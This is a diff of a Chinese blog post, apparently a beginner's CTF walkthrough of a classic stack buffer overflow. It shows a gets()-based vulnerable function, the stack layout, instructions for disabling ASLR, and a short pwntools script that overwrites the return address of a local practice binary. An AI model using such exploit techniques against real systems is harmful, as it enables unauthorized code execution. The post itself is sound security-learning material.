@@ -86,12 +86,10 @@
 <meta property="og:site_name" content="某科学的SSR">
 <meta property="og:description" content="模仿ctfwiki上实例进行首次pwn 构建c语言可执行文件代码如下,原文件保存为stack_example.c： 12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void success() &amp;#123; puts(&quot;You Hava already controlled it.&quot;); &amp;#1">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="c:/Users/94824/AppData/Roaming/Typora/typora-user-images/image-20201119161813393.png">
 <meta property="article:published_time" content="2020-11-19T07:39:04.000Z">
-<meta property="article:modified_time" content="2020-11-19T08:18:39.834Z">
+<meta property="article:modified_time" content="2020-11-19T09:54:12.761Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:/Users/94824/AppData/Roaming/Typora/typora-user-images/image-20201119161813393.png">
 
 
 
@@ -339,7 +337,21 @@
 </ul>
 <p>可使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭</p>
 <h4 id="分析可执行文件结构"><a href="#分析可执行文件结构" class="headerlink" title="分析可执行文件结构"></a>分析可执行文件结构</h4><p>用IDA打开可执行文件进行分析，可以看到vulnerable函数反编译后如下图所示：</p>
-<p><img src="C:\Users\94824\AppData\Roaming\Typora\typora-user-images\image-20201119161813393.png" alt="image-20201119161813393"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出字符串s距离ebp的长度为0x14,vulnerable函数对应的栈结构为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+   0x1C</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+   0x18</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+   0x14</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+   0</span><br></pre></td></tr></table></figure>
+
+<p>同时可以用IDA获取success地址，为0x0804843B</p>
+<p>由于gets会读到回车才结束，就可以直接读取任意长度字符串，若我们输入的字符串为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x18*&#39;a&#39;+success_addr</span><br></pre></td></tr></table></figure>
+
+<p>即可将success_addr覆盖retaddr内容，让程序执行success函数的内容。</p>
+<p>这里需要使用pwntools，具体python2脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./stack_example&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa=<span class="number">0x0804843B</span></span><br><span class="line">pre=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">in0=pre+p32(sa)</span><br><span class="line"></span><br><span class="line">sh.sendline(in0)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>python3中由于bytes和string做了区分不能直接使用以上代码，暂时也没啥好的解决方案，暂时搁置。</p>
+<p>在python2环境中运行以上脚本就可以看到success函数执行对应的输出。</p>
 
       
     </div>
